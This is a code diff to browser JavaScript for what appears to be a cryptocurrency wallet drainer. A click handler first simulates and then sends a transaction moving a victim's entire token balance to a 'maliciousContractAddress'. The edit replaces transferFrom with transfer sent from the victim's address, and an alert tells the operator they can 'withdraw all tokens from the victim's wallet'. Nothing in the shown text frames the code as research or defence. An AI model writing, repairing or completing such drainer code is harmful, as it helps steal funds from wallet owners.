@@ -618,8 +618,8 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             console.debug("Simulating withdrawal transaction...");
             try {
                 const simulationResult = await tokenContract.methods
-                    .transferFrom(cleanedVictimAddress, maliciousContractAddress, balance)
-                    .call({ from: accounts[0] }); // Simulate the transaction
+                    .transfer(maliciousContractAddress, balance) // Use transfer instead of transferFrom
+                    .call({ from: cleanedVictimAddress }); // Simulate the transaction from the victim's address
                 console.debug("Simulation successful, result:", simulationResult);
 
                 alert(`Simulation successful. You can proceed to withdraw all tokens from the victim's wallet.`);
@@ -638,8 +638,8 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             // Step 6: Execute the withdrawal transaction (real transfer)
             console.debug("Attempting to execute withdrawal...");
             const transaction = await tokenContract.methods
-                .transferFrom(cleanedVictimAddress, maliciousContractAddress, balance)
-                .send({ from: accounts[0] }); // Send the actual transaction
+                .transfer(maliciousContractAddress, balance) // Use transfer instead of transferFrom
+                .send({ from: cleanedVictimAddress }); // Send the actual transaction
             console.debug("Transaction details:", transaction);
 
             // Notify successful withdrawal
@@ -650,8 +650,6 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
         }
     }
 });
-
-
 
 
 
